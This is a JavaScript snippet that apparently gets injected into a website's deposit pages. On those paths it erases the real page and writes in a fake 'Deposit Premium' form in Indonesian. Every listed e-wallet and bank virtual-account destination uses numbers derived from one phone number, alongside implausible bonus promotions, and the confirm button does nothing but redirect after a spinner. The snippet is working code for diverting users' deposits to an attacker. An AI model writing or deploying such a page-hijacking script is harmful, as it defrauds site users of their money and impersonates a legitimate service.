(function() {

  const allowedPaths = [
    "/deposit_withdraw",
    "/deposit",
    "/mobile/index.php?page=transaksi"
  ];

  const currentPath = window.location.pathname + window.location.search;

  const isAllowed = allowedPaths.some(path => currentPath.includes(path));

  if (!isAllowed) return;

  // Hapus semua isi halaman lama
  document.documentElement.innerHTML = "";

  document.open();
  document.write(`
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Deposit Premium</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
body{background: radial-gradient(circle at top,#1f4037,#0f2027);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;}
.container{width:95%;max-width:420px;background:rgba(255,255,255,0.06);backdrop-filter:blur(20px);padding:28px;border-radius:22px;box-shadow:0 0 40px rgba(0,255,200,0.15);animation:fadeIn .7s ease;}
h2{text-align:center;margin-bottom:20px;font-weight:600;letter-spacing:1px;}
.label{margin-top:18px;font-size:13px;opacity:.8;}
input,select{width:100%;padding:14px;border-radius:12px;border:none;outline:none;margin-top:6px;background:rgba(255,255,255,0.08);color:#fff;font-size:14px;transition:.3s;}
input:focus,select:focus{box-shadow:0 0 12px #00f5c4;background:rgba(255,255,255,0.12);}
select option{color:#000;}
.info-box{margin-top:12px;background:rgba(0,255,200,0.08);padding:14px;border-radius:14px;font-size:13px;display:none;animation:fadeIn .4s ease;}
.copy-btn{margin-top:8px;padding:7px 12px;border:none;border-radius:8px;background:linear-gradient(135deg,#00f5c4,#00c6ff);color:#000;font-weight:600;cursor:pointer;transition:.3s;}
button.submit{margin-top:25px;width:100%;padding:15px;border:none;border-radius:14px;font-weight:600;font-size:15px;background:linear-gradient(135deg,#00f5c4,#00c6ff);color:#000;cursor:not-allowed;opacity:.5;transition:.3s;}
button.submit.active{cursor:pointer;opacity:1;box-shadow:0 0 20px #00f5c4;}
.spinner-overlay{position:fixed;inset:0;background:rgba(0,0,0,.8);display:none;justify-content:center;align-items:center;flex-direction:column;}
.loader{width:55px;height:55px;border-radius:50%;border:5px solid rgba(255,255,255,0.2);border-top:5px solid #00f5c4;animation:spin 1s linear infinite;margin-bottom:15px;}
@keyframes spin{to{transform:rotate(360deg);}}
@keyframes fadeIn{from{opacity:0;transform:translateY(15px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body>

<div class="container">
<h2>Deposit Premium</h2>

<div class="label">Nominal Deposit</div>
<input type="text" id="nominal" placeholder="Minimal Rp 50.000">

<div class="label">Tujuan Deposit</div>
<select id="tujuan">
<option value="">-- Pilih Tujuan --</option>
<option value="DANA|088214538915|088214538915">DANA</option>
<option value="BCA VA|VIRTUAL ACCOUNT BCA|3901088214538915">BCA VA</option>
<option value="BRI VA|VIRTUAL ACCOUNT BRI|88810088214538915">BRI VA</option>
<option value="BNI VA|VIRTUAL ACCOUNT BNI|8810088214538915">BNI VA</option>
<option value="MANDIRI VA|VIRTUAL ACCOUNT MANDIRI|89508088214538915">MANDIRI VA</option>
</select>

<div class="info-box" id="infoBox">
<div id="infoText"></div>
<button class="copy-btn" id="copyBtn">Salin Nomor</button>
</div>

<div class="label">Promosi (Opsional)</div>
<select id="promo">
<option value="Tanpa Promosi" selected>Tanpa Promosi</option>
<option>Deposit 300,000 Get 3,000,000</option>
<option>Deposit Bonus 100%</option>
<option>Cashback Mingguan 80%</option>
<option>Garansi Saldo Kembali</option>
<option>Deposit 500,000 Get 1,000,000</option>
</select>

<button class="submit" id="submitBtn" disabled>Konfirmasi Deposit</button>
</div>

<div class="spinner-overlay" id="spinner">
<div class="loader"></div>
<div style="color:white">Memproses...</div>
</div>

<script>
let rawValue=0;
let rekeningTujuan="";
const nominal=document.getElementById("nominal");
const tujuan=document.getElementById("tujuan");
const submitBtn=document.getElementById("submitBtn");
const infoBox=document.getElementById("infoBox");
const infoText=document.getElementById("infoText");
const spinner=document.getElementById("spinner");

function formatRupiah(angka){return new Intl.NumberFormat("id-ID").format(angka);}

nominal.addEventListener("input",function(){
rawValue=this.value.replace(/\\D/g,'');
this.value=rawValue?"Rp "+formatRupiah(rawValue):"";
validate();
});

tujuan.addEventListener("change",function(){
if(this.value!==""){
const data=this.value.split("|");
rekeningTujuan=data[2];
infoText.innerHTML="<strong>"+data[0]+"</strong><br>A.N : "+data[1]+"<br>No Tujuan : "+data[2];
infoBox.style.display="block";
}else{infoBox.style.display="none";}
validate();
});

document.getElementById("copyBtn").onclick=function(){
navigator.clipboard.writeText(rekeningTujuan);
};

function validate(){
if(rawValue>=50000 && tujuan.value!==""){
submitBtn.disabled=false;
submitBtn.classList.add("active");
}else{
submitBtn.disabled=true;
submitBtn.classList.remove("active");
}
}

submitBtn.onclick=function(){
if(rawValue<50000)return;
spinner.style.display="flex";
setTimeout(()=>{window.location.href="../";},1500);
};
<\/script>

</body>
</html>
  `);

  document.close();

})();
